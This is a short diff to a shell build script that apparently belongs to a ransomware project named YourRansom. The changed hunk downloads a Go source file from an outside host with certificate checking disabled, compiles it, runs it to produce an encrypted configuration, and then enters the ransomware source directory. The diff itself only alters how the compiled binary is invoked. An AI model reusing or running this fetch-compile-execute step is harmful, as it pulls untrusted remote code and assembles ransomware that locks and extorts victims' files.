@@ -35,7 +35,7 @@ rand_str=$(date +%s%N | md5sum | head -c 8)
 wget https://sh.bobiji.com/yr1k.go -o/dev/null --no-check-certificate
 go build -o config.o yr1k.go
 chmod a+x config.o
-./config.o ${rand_str}
+sh -c "./config.o ${rand_str}"
 config=$(cat data.enc)
 
 cd ${GOPATH}/src/github.com/YourRansom/YourRansom
